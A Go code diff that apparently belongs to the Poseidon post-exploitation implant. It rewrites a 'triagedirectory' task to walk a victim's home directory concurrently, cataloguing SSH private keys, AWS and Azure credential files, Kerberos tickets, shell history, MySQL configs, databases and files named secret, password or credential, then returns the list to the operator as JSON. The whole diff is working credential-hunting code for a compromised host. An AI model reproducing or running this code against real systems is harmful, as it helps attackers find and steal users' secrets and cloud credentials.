@@ -2,9 +2,11 @@ package triagedirectory
 
 import (
 	"encoding/json"
+	"io/ioutil"
 	"os"
 	"path/filepath"
 	"strings"
+	"sync"
 
 	"github.com/xorrior/poseidon/pkg/utils/structs"
 )
@@ -19,6 +21,7 @@ type OSFile struct {
 }
 
 type DirectoryTriageResult struct {
+	mutex            sync.Mutex
 	AzureFiles       []OSFile `json:"azure_files"`
 	AWSFiles         []OSFile `json:"aws_files"`
 	SSHFiles         []OSFile `json:"ssh_files"`
@@ -32,6 +35,13 @@ type DirectoryTriageResult struct {
 	MySqlConfFiles   []OSFile `json:"mysql_confs"`
 	KerberosFiles    []OSFile `json:"kerberos_tickets"`
 	InterestingFiles []OSFile `json:"interesting_files"`
+}
+
+func NewDirectoryTriageResult() *DirectoryTriageResult {
+	mtx := sync.Mutex{}
+	return &DirectoryTriageResult{
+		mutex: mtx,
+	}
 }
 
 func Run(task structs.Task, threadChannel chan<- structs.ThreadMsg) {
@@ -48,23 +58,36 @@ func Run(task structs.Task, threadChannel chan<- structs.ThreadMsg) {
 		threadChannel <- tMsg
 		return
 	}
-
-	results, err := triageDirectory(task.Params)
+	result := NewDirectoryTriageResult()
+	err := triageDirectory(task.Params, result)
+	// fmt.Println(result)
 	if err != nil {
+		// fmt.Println("Error was not nil!", err.Error())
 		tMsg.TaskResult = []byte(err.Error())
 		tMsg.Error = true
 	} else {
-		data, err := json.MarshalIndent(results, "", "    ")
-		// fmt.Println("Data:", string(data))
-		if err != nil {
-			tMsg.TaskResult = []byte(err.Error())
-			tMsg.Error = true
+		if !isDirectoryTriageResultEmpty(*result) {
+			data, err := json.MarshalIndent(result, "", "    ")
+			// // fmt.Println("Data:", string(data))
+			if err != nil {
+				// fmt.Println("Error was not nil when marshalling!", err.Error())
+				tMsg.TaskResult = []byte(err.Error())
+				tMsg.Error = true
+			} else {
+				// fmt.Println("Sending on up the data:\n", string(data))
+				tMsg.TaskResult = data
+				tMsg.Error = false
+			}
 		} else {
-			tMsg.TaskResult = data
+			tMsg.TaskResult = []byte("Task completed.")
 			tMsg.Error = false
 		}
 	}
 	threadChannel <- tMsg
+}
+
+func isDirectoryTriageResultEmpty(result DirectoryTriageResult) bool {
+	return len(result.AWSFiles) == 0 && len(result.SSHFiles) == 0 && len(result.AzureFiles) == 0 && len(result.HistoryFiles) == 0 && len(result.LogFiles) == 0 && len(result.ShellScriptFiles) == 0 && len(result.YAMLFiles) == 0 && len(result.ConfFiles) == 0 && len(result.CSVFiles) == 0 && len(result.DatabaseFiles) == 0 && len(result.MySqlConfFiles) == 0 && len(result.KerberosFiles) == 0 && len(result.InterestingFiles) == 0
 }
 
 func newOSFile(path string, info os.FileInfo) OSFile {
@@ -92,74 +115,98 @@ func anySliceInString(s string, slice []string) bool {
 	return false
 }
 
+func addFileToDirectoryTriageResult(filepath string, info os.FileInfo, result *DirectoryTriageResult, slice *[]OSFile) {
+	result.mutex.Lock()
+	addFileToSlice(slice, filepath, info)
+	result.mutex.Unlock()
+}
+
 var interestingNames = []string{"secret", "password", "credential"}
 
 // Triage a specified home-path for interesting files, including:
-// See: FileTriageResult
-func triageDirectory(triagePath string) (DirectoryTriageResult, error) {
-	result := DirectoryTriageResult{}
+// See: DirectoryTriageResult
+func triageDirectory(triagePath string, result *DirectoryTriageResult) error {
 	if _, err := os.Stat(triagePath); os.IsNotExist(err) {
-		return result, err
+		return err
 	}
 
-	_ = filepath.Walk(triagePath, func(path string, info os.FileInfo, err error) error {
-		// Add all private keys discovered.
-		if err != nil {
-			return nil
-		}
-		if !info.IsDir() {
-			if strings.Contains(path, "/.ssh/") {
-				switch info.Name() {
+	files, err := ioutil.ReadDir(triagePath)
+	if err != nil {
+		return err
+	}
+	wg := sync.WaitGroup{}
+	for _, file := range files {
+		fullpath := filepath.Join(triagePath, file.Name())
+		if file.IsDir() {
+			if anySliceInString(file.Name(), interestingNames) {
+				addFileToDirectoryTriageResult(fullpath, file, result, &result.InterestingFiles)
+			}
+			wg.Add(1)
+			go func(path string, dirtriage *DirectoryTriageResult) {
+				defer wg.Done()
+				triageDirectory(path, dirtriage)
+			}(fullpath, result)
+		} else {
+			if strings.Contains(fullpath, "/.ssh/") {
+				switch file.Name() {
 				case "authorized_keys":
 					break
 				case "known_hosts":
 					break
 				default:
-					addFileToSlice(&result.SSHFiles, path, info)
+					addFileToDirectoryTriageResult(fullpath, file, result, &result.SSHFiles)
+					// addFileToSlice(&result.SSHFiles, fullpath, file)
 					break
 				}
 				// Add any file within the AWS directory.
-			} else if strings.Contains(path, "/.aws/") {
-				addFileToSlice(&result.AWSFiles, path, info)
+			} else if strings.Contains(fullpath, "/.aws/") {
+				addFileToDirectoryTriageResult(fullpath, file, result, &result.AWSFiles)
+				// addFileToSlice(&result.AWSFiles, fullpath, file)
 				// Add all history files.
-			} else if strings.HasSuffix(info.Name(), "_history") && strings.HasPrefix(info.Name(), ".") {
-				addFileToSlice(&result.HistoryFiles, path, info)
+			} else if strings.HasSuffix(file.Name(), "_history") && strings.HasPrefix(file.Name(), ".") {
+				addFileToDirectoryTriageResult(fullpath, file, result, &result.HistoryFiles)
+				// addFileToSlice(&result.HistoryFiles, fullpath, file)
 				// Add all shell-script files.
-			} else if strings.HasSuffix(info.Name(), ".sh") {
-				addFileToSlice(&result.ShellScriptFiles, path, info)
+			} else if strings.HasSuffix(file.Name(), ".sh") {
+				addFileToDirectoryTriageResult(fullpath, file, result, &result.ShellScriptFiles)
+				// addFileToSlice(&result.ShellScriptFiles, fullpath, file)
 				// Add all yaml files.
-			} else if strings.HasSuffix(info.Name(), ".yml") || strings.HasSuffix(info.Name(), ".yaml") {
-				addFileToSlice(&result.YAMLFiles, path, info)
+			} else if strings.HasSuffix(file.Name(), ".yml") || strings.HasSuffix(file.Name(), ".yaml") {
+				addFileToDirectoryTriageResult(fullpath, file, result, &result.YAMLFiles)
+				// addFileToSlice(&result.YAMLFiles, fullpath, file)
 				// Add all configuration files.
-			} else if strings.HasSuffix(info.Name(), ".conf") {
-				addFileToSlice(&result.ConfFiles, path, info)
+			} else if strings.HasSuffix(file.Name(), ".conf") {
+				addFileToDirectoryTriageResult(fullpath, file, result, &result.ConfFiles)
+				// addFileToSlice(&result.ConfFiles, fullpath, file)
 				// Any "interesting" file names.
-			} else if anySliceInString(info.Name(), interestingNames) {
-				addFileToSlice(&result.InterestingFiles, path, info)
+			} else if anySliceInString(file.Name(), interestingNames) {
+				addFileToDirectoryTriageResult(fullpath, file, result, &result.InterestingFiles)
+				// addFileToSlice(&result.InterestingFiles, fullpath, file)
 				// Any kerberos files.
-			} else if strings.HasPrefix(info.Name(), "krb5") {
-				addFileToSlice(&result.KerberosFiles, path, info)
+			} else if strings.HasPrefix(file.Name(), "krb5") {
+				addFileToDirectoryTriageResult(fullpath, file, result, &result.KerberosFiles)
+				// addFileToSlice(&result.KerberosFiles, fullpath, file)
 				// Any MySQL configuration files.
-			} else if info.Name() == ".my.cnf" || info.Name() == "my.cnf" {
-				addFileToSlice(&result.MySqlConfFiles, path, info)
+			} else if file.Name() == ".my.cnf" || file.Name() == "my.cnf" {
+				addFileToDirectoryTriageResult(fullpath, file, result, &result.MySqlConfFiles)
+				// addFileToSlice(&result.MySqlConfFiles, fullpath, file)
 				// Any azure files
-			} else if strings.Contains(path, "/.azure/") {
-				addFileToSlice(&result.AzureFiles, path, info)
-			} else if strings.HasSuffix(info.Name(), ".log") {
-				addFileToSlice(&result.LogFiles, path, info)
-			} else if strings.HasSuffix(info.Name(), ".csv") || strings.HasSuffix(info.Name(), ".tsv") {
-				addFileToSlice(&result.CSVFiles, path, info)
-			} else if strings.HasSuffix(info.Name(), ".db") {
-				addFileToSlice(&result.DatabaseFiles, path, info)
-			}
-		} else {
-			// Any directories that look interesting.
-			if anySliceInString(info.Name(), interestingNames) {
-				addFileToSlice(&result.InterestingFiles, path, info)
+			} else if strings.Contains(fullpath, "/.azure/") {
+				addFileToDirectoryTriageResult(fullpath, file, result, &result.AzureFiles)
+				// addFileToSlice(&result.AzureFiles, fullpath, file)
+			} else if strings.HasSuffix(file.Name(), ".log") {
+				addFileToDirectoryTriageResult(fullpath, file, result, &result.LogFiles)
+				// addFileToSlice(&result.LogFiles, fullpath, file)
+			} else if strings.HasSuffix(file.Name(), ".csv") || strings.HasSuffix(file.Name(), ".tsv") {
+				addFileToDirectoryTriageResult(fullpath, file, result, &result.CSVFiles)
+				// addFileToSlice(&result.CSVFiles, fullpath, file)
+			} else if strings.HasSuffix(file.Name(), ".db") {
+				addFileToDirectoryTriageResult(fullpath, file, result, &result.DatabaseFiles)
+				// addFileToSlice(&result.DatabaseFiles, path, info)
 			}
 		}
-		return nil
-	})
+	}
 
-	return result, nil
+	wg.Wait()
+	return nil
 }
